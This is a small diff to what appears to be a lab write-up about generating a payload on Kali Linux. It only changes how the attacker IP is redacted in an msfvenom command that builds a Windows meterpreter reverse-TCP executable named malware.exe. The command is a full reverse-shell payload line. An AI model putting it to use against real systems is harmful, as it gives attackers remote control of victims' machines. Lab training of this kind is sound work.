@@ -39,7 +39,7 @@ flowchart LR
 
 On Kali Linux terminal, switched to root privileges and generated the lab payload using msfvenom:
 
-**msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.***.**.*** LPORT=4444 -f exe -o malware.exe**
+**msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.x.x.x LPORT=4444 -f exe -o malware.exe**
 
 ### What each part means
 
